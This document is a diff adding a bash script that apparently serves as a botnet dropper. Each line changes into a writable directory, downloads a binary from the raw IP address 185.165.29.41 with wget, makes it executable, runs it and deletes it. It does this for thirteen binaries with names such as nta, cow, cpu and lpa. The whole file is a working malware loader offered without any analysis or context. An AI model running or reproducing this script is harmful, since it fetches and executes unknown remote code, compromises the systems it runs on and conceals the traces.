@@ -1,0 +1,14 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.41/nta; chmod +x nta; ./nta; rm -rf nta
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.41/map; chmod +x map; ./map; rm -rf map
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.41/ba; chmod +x ba; ./ba; rm -rf ba
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.41/cow; chmod +x cow; ./cow; rm -rf cow
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.41/tel; chmod +x tel; ./tel; rm -rf tel
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.41/get; chmod +x get; ./get; rm -rf get
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.41/goa; chmod +x goa; ./goa; rm -rf goa
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.41/fup; chmod +x fup; ./fup; rm -rf fup
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.41/pte; chmod +x pte; ./pte; rm -rf pte
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.41/bae; chmod +x bae; ./bae; rm -rf bae
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.41/cpu; chmod +x cpu; ./cpu; rm -rf cpu
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.41/apa; chmod +x apa; ./apa; rm -rf apa
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.41/lpa; chmod +x lpa; ./lpa; rm -rf lpa
